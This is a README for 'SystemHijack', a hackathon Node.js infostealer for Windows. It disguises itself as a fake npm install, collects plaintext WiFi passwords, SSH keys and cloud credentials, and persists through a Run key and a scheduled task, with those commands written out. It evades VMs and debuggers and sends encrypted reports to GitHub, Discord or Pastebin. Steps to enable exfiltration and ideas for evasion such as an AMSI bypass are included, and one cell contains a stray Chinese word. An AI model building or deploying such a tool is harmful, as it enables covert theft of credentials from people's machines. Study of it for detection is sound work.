# SystemHijack

**THUNDER Hackathon 3.0** — Modular Windows reconnaissance tool. Collects system data, hunts credential files, encrypts the report, and exfiltrates via multiple channels (GitHub API, Discord, Pastebin). Disguises itself as a fake `npm install` while running. **Zero npm dependencies** — uses only Node.js built-ins.

> **Do not run this on any machine you don't own or haven't explicitly authorized.**

---

## Table of Contents

- [Quick Reference Card](#quick-reference-card)
- [Feature Matrix](#feature-matrix)
- [Execution Modes](#execution-modes)
- [Architecture](#architecture)
- [Phase Deep Dive](#phase-deep-dive)
- [Data Collected Reference](#data-collected-reference)
- [Exfil Channels](#exfil-channels)
- [Persistence Details](#persistence-details)
- [Anti-Analysis](#anti-analysis)
- [Safety Guarantees](#safety-guarantees)
- [Testing Guide](#testing-guide)
- [Troubleshooting](#troubleshooting)
- [Setup (for exfil)](#setup-for-exfil)
- [Future Enhancements](#future-enhancements)

---

## Quick Reference Card

```bash
npm install                                # Install (just generates node_modules)
npm test                                   # 102 tests, no side effects
npm run dry-run                            # Safe: recon only, local report, no changes
npm start                                  # Full run: recon + persistence + exfil + cleanup
node src/index.js --cleanup                # Remove all artifacts from previous runs
```

---

## Feature Matrix

| Category | Feature | Status |
|---|---|---|
| **Masquerading** | Fake `npm install` progress UI | ✅ |
| **Masquerading** | Real package names + versions (express, react, etc.) | ✅ |
| **Masquerading** | Deprecation warnings + vulnerability audit | ✅ |
| **Masquerading** | Lifecycle scripts (node-gyp rebuild, postinstall) | ✅ |
| **Recon — System** | OS hostname, platform, architecture, type, release | ✅ |
| **Recon — System** | System uptime | ✅ |
| **Recon — CPU** | Core count, model name, speed (MHz) | ✅ |
| **Recon — Memory** | Total RAM (GB), free RAM (GB) | ✅ |
| **Recon — User** | Username, home directory | ✅ |
| **Recon — Environment** | PATH, USERNAME, HOME, TEMP, SHELL, NODE_ENV, COMPUTERNAME, APPDATA, SYSTEMDRIVE | ✅ |
| **Recon — Hardware ID** | MachineGuid via registry (Win/Mac/Linux) | ✅ |
| **Recon — WiFi** | Saved SSIDs + plaintext passwords (parallel, locale-independent) | ✅ |
| **Recon — Software** | Installed applications from both 32/64-bit Uninstall registry keys | ✅ |
| **Recon — Processes** | Running processes (Name, PID, ExecutablePath) via PowerShell | ✅ |
| **File Hunting — Env** | Recursive `.env` / credential file scanner (depth 50) | ✅ |
| **File Hunting — Secrets** | SSH keys (`id_rsa`, `id_ed25519`, etc.) | ✅ |
| **File Hunting — Secrets** | AWS credentials (`~/.aws/credentials`) | ✅ |
| **File Hunting — Secrets** | Azure tokens (`~/.azure/accessTokens.json`) | ✅ |
| **File Hunting — Secrets** | GCloud credentials (`~/.config/gcloud/`) | ✅ |
| **Persistence** | Copies project to `~/.windows-update/` | ✅ |
| **Persistence** | HKCU Registry Run key | ✅ |
| **Persistence** | Scheduled task fallback (`schtasks /create`) | ✅ |
| **Persistence** | Auto-cleanup on exit (never left behind) | ✅ |
| **Persistence** | `--cleanup` flag for manual removal | ✅ |
| **Exfil** | GitHub Contents API (AES-256-GCM encrypted) | ✅ |
| **Exfil** | Discord webhook (multipart with embedded file) | ✅ |
| **Exfil** | Pastebin API (private, 1-month expiry) | ✅ |
| **Exfil** | Shuffled channel order per run (OPSEC) | ✅ |
| **Exfil** | Connectivity pre-check before any upload | ✅ |
| **Exfil** | Retry with exponential backoff (3 attempts) | ✅ |
| **Anti-Analysis** | Fake npm install UI (masquerading) | ✅ |
| **Anti-Analysis** | VM detection (files, MAC prefix, RAM/CPU heuristics) | ✅ |
| **Anti-Analysis** | Debugger detection (NODE_OPTIONS, timing, process scan) | ✅ |
| **Anti-Analysis** | String obfuscation (base64 at rest, decoded at runtime) | ✅ |
| **Anti-Analysis** | User-Agent spoofing (Chrome 125) | ✅ |
| **Safety** | Dry-run mode (no writes, no network, no persistence) | ✅ |
| **Safety** | Auto-cleanup on exit / SIGINT / SIGTERM / crash | ✅ |
| **Safety** | All OS commands have AbortController timeouts | ✅ |
| **Safety** | All collectors wrapped in try/catch (graceful degradation) | ✅ |
| **Safety** | File ops scoped to `~/.windows-update/` (path traversal protected) | ✅ |
| **Safety** | Symlink loop protection in recursive scanner | ✅ |
| **Safety** | File size limits (100KB) for credential scanning | ✅ |
| **Safety** | Locale-independent WiFi parsing (7 languages) | ✅ |
| **Testing** | 102 tests, `node:test`, zero dependencies | ✅ |
| **Testing** | All OS commands mocked — no system impact | ✅ |
| **Deferred** | Win32 API for registry reads | 🔜 |
| **Deferred** | AMSI bypass / runtime obfuscation | 🔜 |
| **Deferred** | Report compression (zlib) before exfil | 🔜 |

---

## Commands Reference

| Command | Mode | Safety | What happens |
|---|---|---|---|
| `npm install` | Setup | ✅ Safe | Installs `node_modules` (empty, zero deps needed at runtime) |
| `npm test` | Testing | ✅ Safe | Runs 102 tests via `node:test`. All OS commands mocked. No file writes, no network, no system changes. |
| `npm run dry-run` | **Dry-run** | ✅ Safe | Full recon + report written to CWD. **No files copied, no registry written, no scheduled tasks, no exfil, no network.** Recommended for first run. |
| `npm start` | **Normal** | ⚠️ Changes system | Fake npm install UI → recon → file hunting → persistence (copies project + registry + task) → exfil → auto-cleanup on exit. Registry entries are **auto-removed** when process exits. |
| `node src/index.js --cleanup` | **Cleanup** | ✅ Safe | Standalone cleanup: removes HKCU Run key, scheduled task, `~/.windows-update/`, `system-report.json`, `%TEMP%\.wu-run.log`. No-op if nothing exists. |
| `npm run lint` | Linting | ✅ Safe | Runs ESLint on source and tests. Requires dev dependencies installed. |

---

## Execution Modes

| Aspect | `--dry-run` | Normal (`npm start`) | `--cleanup` |
|---|---|---|---|
| Recon phases | ✅ Full | ✅ Full | ❌ |
| Safety checks (VM, debugger) | ✅ | ✅ | ❌ |
| Fake npm install UI | ✅ | ✅ | ❌ |
| Write report to CWD | ✅ `system-report.json` | ✅ `system-report.json` | ❌ |
| Copy project to `~/.windows-update/` | ❌ Skipped | ✅ | ❌ |
| Registry Run key | ❌ Skipped | ✅ (auto-removed on exit) | ❌ |
| Scheduled task | ❌ Skipped | ✅ (auto-removed on exit) | ❌ |
| Exfil (network) | ❌ Skipped | ✅ (if credentials configured) | ❌ |
| File watcher | ❌ Skipped | ✅ | ❌ |
| Remove registry Run key | ❌ Skipped | ✅ Auto on exit | ✅ |
| Remove scheduled task | ❌ Skipped | ✅ Auto on exit | ✅ |
| Delete `~/.windows-update/` | ❌ | ❌ | ✅ |
| Delete `system-report.json` | ❌ | ✅ (only after successful exfil) | ✅ |
| Delete `%TEMP%\.wu-run.log` | ❌ | ❌ | ✅ |

---

## Architecture

```
C:\Users\...\SystemHijack\
│
├── src/
│   │
│   ├── index.js                          # ENTRY POINT
│   │   Orchestrates everything: starts fake npm install UI, runs safety
│   │   checks, executes all 3 phases, builds report, handles cleanup.
│   │   Listens for --dry-run and --cleanup flags.
│   │   Registers exit handlers for auto-cleanup on SIGINT/SIGTERM/crash.
│   │
│   ├── app/
│   │   ├── config.js                     # CREDENTIAL DECRYPTION
│   │   │   XOR-decrypts exfil credentials using MachineGuid-derived key.
│   │   │   Ships with empty ENCRYPTED blob — exfil is disabled by default.
│   │   │
│   │   ├── exfil.js                      # EXFIL ROUTER
│   │   │   Checks connectivity first (HEAD to github.com, google.com,
│   │   │   api.github.com). Shuffles channel order randomly. Tries each
│   │   │   with retry. Returns true on first success.
│   │   │
│   │   ├── orchestrator.js               # PHASE ORCHESTRATOR
│   │   │   Runs all 8 collectors in parallel via Promise.allSettled.
│   │   │   Handles file hunting (env + secrets). Manages project copy
│   │   │   and persistence install. Contains cleanupArtifacts() for
│   │   │   removing all traces. Builds the final report object.
│   │   │
│   │   └── uploader.js                   # GITHUB UPLOADER
│   │       AES-256-GCM encrypts the report, base64-encodes it, and PUTs
│   │       to GitHub Contents API. Handles existing file SHAs for
│   │       overwrites. Retry with exponential backoff.
│   │
│   ├── system/
│   │   ├── system.js                     # OS INFO (sync)
│   │   │   Wraps os.hostname(), os.platform(), os.arch(), os.type(),
│   │   │   os.release(), os.uptime(). All values through safe() → "N/A".
│   │   │
│   │   ├── cpu.js                        # CPU INFO (sync)
│   │   │   os.cpus() for count, model, speed. Falls back to "N/A".
│   │   │
│   │   ├── memory.js                     # RAM INFO (sync)
│   │   │   os.totalmem() / os.freemem() converted to GB, 2 decimal places.
│   │   │
│   │   ├── user.js                       # USER INFO (sync)
│   │   │   os.homedir() + process.env.USERNAME/USER.
│   │   │
│   │   ├── env.js                        # ENVIRONMENT VARIABLES (sync)
│   │   │   Reads 9 key vars: PATH, USERNAME, HOME, TEMP, SHELL,
│   │   │   NODE_ENV, COMPUTERNAME, APPDATA, SYSTEMDRIVE.
│   │   │
│   │   ├── machineId.js                  # MACHINEGUID (sync)
│   │   │   Primary: reg query HKLM\...\Cryptography\MachineGuid.
│   │   │   Fallback: wmic csproduct get uuid → PowerShell Get-CimInstance.
│   │   │   Cross-platform: Mac (ioreg), Linux (/etc/machine-id).
│   │   │   Cached after first call. Hashed version for report IDs.
│   │   │
│   │   ├── wifi.js                       # WIFI PROFILES (async, parallel)
│   │   │   Calls netsh wlan show profiles, extracts SSID names via
│   │   │   locale-independent regex (handles non-English output).
│   │   │   Then fires ALL netsh wlan show profile name="X" key=clear
│   │   │   commands in parallel via Promise.allSettled.
│   │   │   Password regex matches "Key Content" in 7 languages.
│   │   │   Individual profile failures → password = "N/A".
│   │   │
│   │   ├── software.js                   # INSTALLED SOFTWARE (async, parallel)
│   │   │   Queries both 32-bit and 64-bit Uninstall registry keys in
│   │   │   parallel (reg query /s). Parses DisplayName + DisplayVersion.
│   │   │   Deduplicates by name|version pair.
│   │   │
│   │   ├── processes.js                  # RUNNING PROCESSES (async)
│   │   │   Calls PowerShell Get-Process → Select-Object Name,Id,Path →
│   │   │   ConvertTo-Json. Parses JSON directly. Handles array and
│   │   │   single-object output. Replaces deprecated wmic.
│   │   │
│   │   ├── vmDetect.js                   # VM DETECTION (sync)
│   │   │   Three checks: (1) existence of VMware/VirtualBox/QEMU tool
│   │   │   files in program paths, (2) MAC address prefix matching
│   │   │   against 10 known VM OUI ranges, (3) suspiciously low RAM
│   │   │   (<2GB) or few CPU cores (≤2). Confidence: high (2+ indicators)
│   │   │   or low (1 indicator).
│   │   │
│   │   ├── debugDetect.js                # DEBUGGER DETECTION (sync)
│   │   │   Three checks: (1) NODE_OPTIONS env var for --inspect/--debug,
│   │   │   (2) timing analysis (1M iteration loop >100ms = possible
│   │   │   debugger overhead), (3) running process scan for 17 known
│   │   │   analysis tools (IDA, x64dbg, Windbg, Wireshark, ProcMon,
│   │   │   Process Hacker, Fiddler, etc.).
│   │   │
│   │   └── persist.js                    # PERSISTENCE (sync)
│   │       install(): writes HKCU\...\Run\NodePackageUpdater via reg add.
│   │       On failure: falls back to schtasks /create /tn NodePackageUpdater.
│   │       uninstall(): removes both registry entry and scheduled task.
│   │       Both are no-ops in dry-run mode.
│   │
│   ├── files/
│   │   ├── crud.js                       # SCOPED FILE OPERATIONS
│   │   │   createFile / readFile / updateFile / deleteFile — all scoped
│   │   │   to ~/.windows-update/ via isSafe() path prefix check. Throws
│   │   │   FileSystemError on access denied. copyDirectory recursively
│   │   │   copies with mkdirSync.
│   │   │
│   │   ├── envHunter.js                  # ENV FILE HUNTER (recursive)
│   │   │   Scans Desktop/Documents/Downloads. Recursive depth 50. Skips
│   │   │   10 directory types (node_modules, .git, .venv, etc.). Skips
│   │   │   hidden dirs (dot-prefixed). Skips files >100KB, symlinks,
│   │   │   and symlink loops (via realPath tracking). Matches filenames
│   │   │   against base64-obfuscated keyword list. Requires KEY=VALUE
│   │   │   content to include file.
│   │   │
│   │   └── secretHunter.js               # SECRET/CREDENTIAL HUNTER
│   │       Scans known config directories for cloud/SSH credentials:
│   │       ~/.ssh/ (id_rsa, id_ed25519, config, known_hosts, etc.)
│   │       ~/.aws/ (credentials, config)
│   │       ~/.azure/ (azureProfile.json, accessTokens.json)
│   │       ~/.config/gcloud/ (credentials.db, access_tokens.db, etc.)
│   │       Applies 100KB size limit per file. Returns categorized results.
│   │
│   ├── utils/
│   │   ├── crypto.js                     # CRYPTO UTILITIES
│   │   │   xorEncrypt/xorDecrypt: XOR cipher with SHA256(MachineGuid+salt)
│   │   │   encryptAes: AES-256-GCM with random IV, returns {iv, tag, data}
│   │   │   hashId: SHA256(MachineGuid + "thunder-hack-salt") for reports
│   │   │   obfuscate/deobfuscate: base64 encode/decode for string hiding
│   │   │
│   │   ├── errors.js                     # CUSTOM ERROR TYPES
│   │   │   PhaseError: wraps phase name + inner error
│   │   │   FileSystemError: wraps operation + path + inner error
│   │   │   NetworkError: wraps URL + HTTP status + inner error
│   │   │
│   │   ├── logger.js                     # LEVELED LOGGER
│   │   │   Levels: DEBUG < INFO < WARN < ERROR. Silent mode (suppresses
│   │   │   all but ERROR to console). File output to configurable path.
│   │   │   Timestamped entries [YYYY-MM-DD HH:MM:SS] [LEVEL].
│   │   │
│   │   ├── execAsync.js                  # ASYNC EXEC WRAPPER
│   │   │   Wraps child_process.exec in a Promise with AbortController.
│   │   │   Configurable timeout (default 10s). Rejects on timeout with
│   │   │   descriptive message including the command.
│   │   │
│   │   ├── retry.js                      # RETRY WITH BACKOFF
│   │   │   Exponential backoff: 1s, 2s, 4s (default 3 retries). Per-call
│   │   │   timeout via AbortController. Configurable label for logging.
│   │   │   Logs warnings on retry, error on final failure. Returns false
│   │   │   when exhausted.
│   │   │
│   │   └── safe.js                       # NULL GUARD
│   │       Returns value ?? "N/A". Used by all sync collectors to prevent
│   │       null/undefined in report JSON.
│   │
│   ├── monitor/
│   │   └── watcher.js                    # FILE MONITOR
│   │       Uses fs.watch (recursive) on ~/.windows-update/. Debounces
│   │       rapid events (200ms window). Logs CREATE/MODIFY/DELETE events.
│   │       Triggers callback on suspicious filenames (.env, password,
│   │       secret, token, etc.). Cleans up on SIGINT/SIGTERM.
│   │
│   └── report/
│       └── generator.js                  # REPORT WRITER
│           Writes system-report.json to process.cwd(). Creates parent
│           directories if missing. 4-space indentation. Returns {success,
│           path}. Throws FileSystemError on failure.
│
├── tests/                                # 102 TESTS
│   ├── crud.test.js                      # 10 tests: CRUD scope + copy dir
│   ├── crypto.test.js                    # 9 tests: XOR, AES, hashId
│   ├── debugDetect.test.js               # 3 tests: flags, timing, process
│   ├── envHunter.test.js                 # 6 tests: recursive scan, filters
│   ├── errors.test.js                    # 6 tests: Phase, FS, Network errors
│   ├── execAsync.test.js                 # 3 tests: success, failure, timeout
│   ├── exfil.test.js                     # 1 test: graceful failure
│   ├── generator.test.js                 # 2 tests: write + failure
│   ├── logger.test.js                    # 3 tests: levels, silent, methods
│   ├── machineId.test.js                 # 3 tests: GUID + hashed
│   ├── orchestrator.test.js              # 12 tests: collect, hunt, CRUD, report
│   ├── persist.test.js                   # 7 tests: install + uninstall (+dry)
│   ├── processes.test.js                 # 4 tests: JSON parse, error handling
│   ├── retry.test.js                     # 4 tests: success, retry, timeout
│   ├── safe.test.js                      # 3 tests: null/undefined/value
│   ├── secretHunter.test.js              # 3 tests: find, content, size limit
│   ├── software.test.js                  # 4 tests: parse, dedup, failure
│   ├── system.test.js                    # 5 tests: cpu, memory, system, env, user
│   ├── uploader.test.js                  # 2 tests: no creds, retry fail
│   ├── vmDetect.test.js                  # 3 tests: clean, files, MAC
│   ├── watcher.test.js                   # 2 tests: missing dir, valid dir
│   └── wifi.test.js                      # 3 tests: profiles, failure, details
│
├── tools/
│   └── encode-creds.js                   # CREDENTIAL ENCODER
│       Reads .env, XOR-encrypts with MachineGuid, prints ENCRYPTED blob
│       for pasting into config.js. Ties credentials to specific machine.
│
├── package.json                          # Scripts: start, dry-run, test, lint
├── .eslintrc.js                          # ESLint config (node, es2022, CJS)
├── .gitignore                            # Ignores: node_modules, .env, report, workspace
└── README.md                             # This file
```

---

## Phase Deep Dive

### Phase 1 — System Recon

| Collector | Type | Command/Source | Timeout | Fallback |
|---|---|---|---|---|
| `system.js` | Sync | `os.hostname()`, `os.platform()`, etc. | Instant | `"N/A"` via `safe()` |
| `cpu.js` | Sync | `os.cpus()` | Instant | `{}` |
| `memory.js` | Sync | `os.totalmem()`, `os.freemem()` | Instant | `{}` |
| `user.js` | Sync | `os.homedir()`, `process.env.USERNAME` | Instant | `"N/A"` via `safe()` |
| `env.js` | Sync | `process.env.PATH`, `TEMP`, etc. | Instant | `"N/A"` via `safe()` |
| `machineId.js` | Sync | `reg query HKLM\...\MachineGuid` | 5s | `"unknown"` |
| `wifi.js` | Async | `netsh wlan show profiles` + `key=clear` per SSID | 10s each, parallel | `[]` |
| `software.js` | Async | `reg query HKLM\...\Uninstall /s` (x2) | 8s each, parallel | `[]` |
| `processes.js` | Async | `powershell Get-Process \| ConvertTo-Json` | 10s | `[]` |

All 8 collectors run via `Promise.allSettled` — a single collector failure never blocks others. Each collector is wrapped in a try/catch within the phase.

### Phase 2 — File Hunting

**Env files** (`envHunter.js`):
- Targets: Desktop, Documents, Downloads (checks OneDrive variants first)
- Match: filename is `.env`, starts with `.env.`, ends with `.env`, or contains any of 11 base64-obfuscated keywords (password, secret, token, apikey, credential, private, config, key, etc.)
- Content validation: must contain at least one `KEY=VALUE` pair (regex: `/^\s*(?:export\s+)?[A-Za-z_]\w*\s*=/m`)
- Skip: `node_modules`, `.git`, `.venv`, `__pycache__`, `bin`, `obj`, `vendor`, hidden dirs, symlinks, files >100KB, symlink loops (tracked via `fs.realpathSync`)
- Depth: max 50 levels

**Secret files** (`secretHunter.js`):
- Scans `~/.ssh/` for: `id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`, `config`, `known_hosts`, `authorized_keys`
- Scans `~/.aws/` for: `credentials`, `config`
- Scans `~/.azure/` for: `azureProfile.json`, `accessTokens.json`
- Scans `~/.config/gcloud/` for: `credentials.db`, `access_tokens.db`, `application_default_credentials.json`
- File size limit: 100KB per file

### Phase 3 — Persistence

1. **Project copy**: Recursively copies `src/` to `~/.windows-update/src/`. Also copies `package.json` and `README.md`.

2. **Registry Run key** (primary):
   ```
   Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   Name: NodePackageUpdater
   Value: "C:\Program Files\nodejs\node.exe" "C:\Users\<user>\.windows-update\src\index.js"
   ```

3. **Scheduled task** (fallback, only if registry fails):
   ```
   Name: NodePackageUpdater
   Trigger: At logon
   Action: node "C:\Users\<user>\.windows-update\src\index.js"
   ```

4. **Auto-cleanup on exit**: Both registry and task entries are removed when the process exits (via `process.on("exit")`, `SIGINT`, `SIGTERM`, or `uncaughtException` handlers).

**Note**: Phase 3 is completely skipped in `--dry-run` mode.

---

## Data Collected Reference

| Group | Field | Source |
|---|---|---|
| **System** | hostname, platform, architecture, osType, osRelease, uptimeSeconds | `os` module |
| **CPU** | count, model, speedMHz | `os.cpus()` |
| **Memory** | totalGB, freeGB | `os.totalmem()`, `os.freemem()` |
| **User** | homeDirectory, username | `os.homedir()`, `process.env` |
| **Environment** | PATH, USERNAME, HOME, TEMP, SHELL, NODE_ENV, COMPUTERNAME, APPDATA, SYSTEMDRIVE | `process.env` |
| **Machine ID** | MachineGuid (registry), hashedSystemId (SHA256) | Registry, WMI, ioreg, /etc/machine-id |
| **WiFi** | ssid, password (plaintext) | `netsh wlan show profile name="X" key=clear` |
| **Software** | name, version | Registry `HKLM\...\Uninstall` |
| **Processes** | Name, ProcessId, ExecutablePath | PowerShell `Get-Process` |
| **Env files** | path, name, matchedKeyword, content | Recursive file scan |
| **Secret files** | path, name, category, content | Known cloud/SSH paths |
| **Safety** | isVM, confidence, indicators | VM file/MAC/RAM/CPU heuristics |
| **Safety** | isDebugged, indicators | NODE_OPTIONS, timing, process scan |
| **Persistence** | crudOperations (all steps + status) | Logged during Phase 3 |
| **Runtime** | nodeVersion, pid, workingDirectory, executionTimeMs | `process.version`, `process.pid`, etc. |
| **Errors** | Array of error messages (if any) | Caught and collected per-phase |

---

## Exfil Channels

All channels are skipped if credentials are missing (default). Connectivity is pre-checked against 3 URLs before any exfil attempt.

| Channel | Method | URL | Credential Required | Format |
|---|---|---|---|---|
| **GitHub** | PUT (Contents API) | `https://api.github.com/repos/{owner}/{repo}/contents/reports/{id}.json` | `GITHUB_TOKEN + OWNER + REPO` | AES-encrypted report, base64-encoded in JSON body |
| **Discord** | POST (multipart) | Webhook URL from config | `DISCORD_WEBHOOK` | Multipart form with embed + attached encrypted JSON file |
| **Pastebin** | POST (form-urlencoded) | `https://pastebin.com/api/api_post.php` | `PASTEBIN_KEY` | Private paste, 1-month expiry, encrypted JSON content |

Order is randomized per run (Fisher-Yates shuffle). Each channel has exponential backoff (1s, 2s, 4s). On first success, remaining channels are skipped. Local report is deleted only after a successful upload.

---

## Persistence Details

| Mechanism | Scope | Command | Auto-removed | Notes |
|---|---|---|---|---|
| Registry Run key | HKCU | `reg add "HKCU\...\Run" /v "NodePackageUpdater" /t REG_SZ /d "...node.exe...index.js" /f` | ✅ On exit | Primary method |
| Scheduled task | System | `schtasks /create /tn "NodePackageUpdater" /tr "...node.exe...index.js" /sc onlogon /f` | ✅ On exit | Fallback method |
| Hidden project dir | User home | `~/.windows-update/` | ❌ (removed by `--cleanup`) | Project files for persistence target |

The uninstall function is called on:
- Normal `process.on("exit")`
- `SIGINT` (Ctrl+C)
- `SIGTERM`
- `uncaughtException`
- Standalone `--cleanup` flag

---

## Anti-Analysis

### Masquerading
- Fake `npm install` progress with real package names (express, react, lodash, etc.)
- Random KB number patterns replaced with package versions (e.g., `express@4.21.0`)
- Progress bars using `█` and `░` characters with spinner animation
- Deprecation warnings mimicking real npm output format
- Vulnerability count at the end (always >0, with low/moderate/high breakdown)
- Lifecycle script section with `node-gyp rebuild` and `postinstall` phases
- Duration varies randomly (20-40 seconds) to look realistic

### VM Detection
- **File check**: 14 known VM tool files (VMware, VirtualBox, QEMU paths cross-platform)
- **MAC prefix**: 10 known VM OUI ranges (VMware: 00:0C:29, 00:50:56, 00:05:69; VirtualBox: 08:00:27; Hyper-V: 00:15:5D, etc.)
- **RAM heuristic**: Below 2GB total → suspicious
- **CPU heuristic**: 2 or fewer cores → suspicious
- **Confidence**: "high" for 2+ indicators, "low" for 1, "none" for 0

### Debugger Detection
- **NODE_OPTIONS scan**: Looks for `--inspect`, `--debug`, `--inspect-brk` flags
- **Timing analysis**: 1M iteration loop — if >100ms, possible debugger overhead
- **Process scan**: Checks running processes for 17 known analysis tools (IDA, x64dbg, OllyDbg, Windbg, devenv, Immunity Debugger, DebugView, Process Hacker, ProcMon, ProcExp, TCPView, Wireshark, Fiddler, Charles, HTTP Toolkit)

### String Obfuscation
- Suspicious strings (registry paths, keywords, command arguments) are stored as base64
- Decoded at runtime via `deobfuscate()` before use
- Examples: `MachineGuid`, registry key paths, program names, log messages

### Network Evasion
- User-Agent spoofed to `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36`
- Exfil channel order randomized per run (Fisher-Yates shuffle)
- Connectivity pre-check before any exfil attempt (prevents analysis of network behavior in air-gapped environments)

---

## Safety Guarantees

This tool is designed to be safe for evaluation. Here is every safety measure:

1. **`--dry-run` guard**: Every file write, registry modification, process spawn, and network call checks the `DRY_RUN` flag first. If set, the operation is skipped with a log entry.

2. **Auto-cleanup on exit**: The `safeCleanup()` function is registered on `process.on("exit")`, `SIGINT`, `SIGTERM`, and `uncaughtException`. It always runs, even on crash. It removes the registry Run key and scheduled task.

3. **`--cleanup` flag**: Standalone mode that only runs cleanup and exits. Removes registry, tasks, hidden directory, report, and logs. Safe to run at any time.

4. **Graceful degradation**: Every collector is wrapped in try/catch. If a collector fails (permission denied, command not found, timeout), it returns a fallback value (empty object/array) and logs a warning. No single failure can crash the process.

5. **All commands have timeouts**: Every `child_process` call uses `AbortController` with timeouts ranging from 5s to 10s. No command can hang indefinitely.

6. **`Promise.allSettled`**: All parallel collectors use `allSettled` instead of `all`. A rejection in one collector never propagates to others.

7. **Path traversal protection**: File operations in `crud.js` check that resolved paths start with `~/.windows-update/`. Operations outside this scope throw `FileSystemError`.

8. **Symlink protection**: `envHunter.js` tracks real paths via `fs.realpathSync` in a Set. If a symlink would create a loop, it's skipped.

9. **File size limits**: Both env and secret hunters skip files larger than 100KB. Prevents hanging on large files and limits report size.

10. **Mock-based tests**: All 102 tests mock OS commands via `node:test`'s `mock.method()`. Tests never spawn real processes, write files, or touch the network. Zero system impact.

11. **Default-disabled exfil**: `config.js` ships with `ENCRYPTED = ""`. Without a valid encrypted blob, all exfil channels gracefully return `false`. The tool will never attempt network calls without explicit credential setup.

12. **Connectivity pre-check**: Before any exfil, 3 URLs are probed with HEAD requests (5s timeout each). If all fail, exfil is skipped entirely.

---

## Testing Guide

### Running Tests

```bash
npm test          # All 102 tests
```

Tests use Node.js built-in `node:test` — zero dependencies.

### Test Structure

All tests are in `tests/*.test.js`. They follow this pattern:

```js
const { describe, it, mock, after } = require("node:test");
const assert = require("node:assert/strict");
const childProcess = require("child_process");

describe("feature name", () => {
    after(() => mock.restoreAll());

    it("tests a specific behavior", async () => {
        mock.method(childProcess, "exec", (cmd, opts, cb) => {
            cb(null, '{"mocked": "json"}');
        });
        const result = await getProcessList();
        assert.equal(result.length, 1);
    });
});
```

### Mocking Strategy

| OS Command | How it's mocked |
|---|---|
| `child_process.exec` | `mock.method(childProcess, "exec", (cmd, opts, cb) => cb(null, mockOutput))` |
| `child_process.execSync` | `mock.method(childProcess, "execSync", () => mockOutput)` |
| `fs.existsSync` | `mock.method(fs, "existsSync", (p) => expectedReturn)` |
| `fs.readdirSync` | `mock.method(fs, "readdirSync", () => [...])` |
| Network (`fetch`) | Not mocked — tests avoid network (config has empty creds) |

### Adding New Tests

1. Create `tests/your-feature.test.js`
2. Mock OS commands at the `child_process` level
3. Clear module cache before requiring the module under test:
   ```js
   delete require.cache[require.resolve("../src/system/yourModule")];
   ```
4. Always call `mock.restoreAll()` in `after()`
5. Run with `npm test`

---

## Troubleshooting

### "WiFi profiles query failed: no adapter"
The system has no wireless adapter, or the wireless service is stopped. This is non-fatal — the collector returns `[]` and the report omits WiFi data.

### "Process list query failed"
PowerShell execution policy may restrict script execution. Run `powershell Set-ExecutionPolicy -Scope CurrentUser RemoteSigned` to allow. On systems without PowerShell, this collector returns `[]`.

### "Registry MachineGuid query failed"
The `reg query` command failed, usually due to permission issues. Falls back to WMI (`wmic csproduct get uuid`) or PowerShell (`Get-CimInstance`). On non-Windows systems, uses `ioreg` (Mac) or `/etc/machine-id` (Linux).

### "Failed to decrypt credentials — MachineGuid mismatch?"
The encrypted blob in `config.js` was generated on a different machine. Re-run `node tools/encode-creds.js` on the current machine to generate a new blob.

### "Exfil all channels exhausted"
Either no credentials are configured (default), or all configured channels failed after retries. Check network connectivity and credential validity.

### "npm WARN deprecated" messages in test output
These are printed by the logger module when it's not in silent mode. The test suite runs with `logger.silent(false)` by default. Set `logger.silent(true)` in `src/index.js` to suppress.

### PowerShell not available
`processes.js` requires PowerShell for `Get-Process`. On systems without PowerShell (uncommon on modern Windows), the collector returns `[]`. Consider installing PowerShell Core as a fallback.

### Tests fail with mock interference
If tests fail unexpectedly, ensure `mock.restoreAll()` is called after each test suite. Module cache clearing (`delete require.cache[...]`) is required when a module is loaded with different mock state.

---

## Setup (for exfil)

This repo ships with an empty credential blob. To enable actual exfil:

1. Create a `.env` file at the project root:

```
GITHUB_TOKEN=your_github_token_here
GITHUB_OWNER=your_github_username
GITHUB_REPO=your_repo_name
DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
PASTEBIN_KEY=your_pastebin_api_dev_key
```

2. Generate a MachineGuid-bound encrypted blob:

```bash
node tools/encode-creds.js
```

3. Paste the output (`const ENCRYPTED = "..."`) into `src/app/config.js` over the existing `ENCRYPTED = ""` line.

Credentials are XOR-encrypted with a SHA256 key derived from your machine's MachineGuid — the blob is tied to that specific machine. Re-run `encode-creds.js` if you change machines.

---

## Future Enhancements

These were deliberately omitted to keep the project safe for evaluation on bare-metal systems:

| Feature | Description | Benefit |
|---|---|---|
| **Win32 API for registry reads** | Replace spawned `reg.exe` with direct API calls (via `node-ffi` or `edge-js`) | Reduces EDR visibility, faster |
| **AMSI bypass / runtime obfuscation** | In-memory string XOR and dynamic method resolution using `Function()` constructor or `eval()` | Evades AMSI scanning of static strings |
| **Report compression** | `zlib.gzipSync()` before AES encryption | Reduces exfil size 5-10x |
| **WMI event subscription** | Alternative persistence via `__EventFilter` + `CommandLineEventConsumer` | More隐蔽 than registry/task |

These are well-documented techniques in offensive security literature. Implement only in authorized, contained environments.
